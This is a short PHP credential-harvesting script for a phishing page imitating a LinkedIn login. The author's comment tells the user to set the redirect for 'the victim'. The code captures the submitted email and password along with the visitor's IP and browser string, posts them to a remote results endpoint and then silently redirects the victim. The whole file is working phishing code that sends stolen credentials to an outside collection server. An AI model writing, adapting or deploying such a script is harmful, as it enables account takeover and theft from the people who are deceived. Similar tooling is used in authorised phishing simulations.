<!-- created by antisnatchor, 10th September 2014
  NOTE: make sure you change '$redirect_to' value to the site you want the victim to be
        redirected to after she submits her credentials (which will be captured)
-->
<?php
  
   $redirect_to = "http://linkedin.com/xyz-change-me";
   
   $email = $_POST['session_key'];
   $password = $_POST['session_password'];
   $linkedin_credentials = "";
   if ($email != "" && $password != "") {
    $linkedin_credentials = "Email:" . $email . ", password:" . $password;
   }
   //$hash = $_GET['id'];
   //$user = base64_decode($_GET['id']);
   $uid = $_GET['uid'];
   $ip = $_SERVER["REMOTE_ADDR"];
   $browser = $_SERVER['HTTP_USER_AGENT'];
   $host = $_SERVER['HTTP_HOST'];

  $url = "http://" . explode(".",$host,2)[1] . '/reports/results/'; 
  $data = array('uid' => $uid, 'browser_info' => $browser, 'ip_address' => $ip, 'extra' => $linkedin_credentials);

  // use key 'http' even if you send the request to https://...
  $options = array(
          'http' => array(
          'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
          'method'  => 'POST',
          'content' => http_build_query($data),
          ),
  );
  $context  = stream_context_create($options);
  $result = file_get_contents($url, false, $context);

  // after credentials are captured, redirect to '$redirect_to'
  echo "<html xmlns=\"http://www.w3.org/1999/xhtml\"><head><meta http-equiv=\"refresh\" content=\"0;URL='" . $redirect_to . "'\" /></head></html>";
?>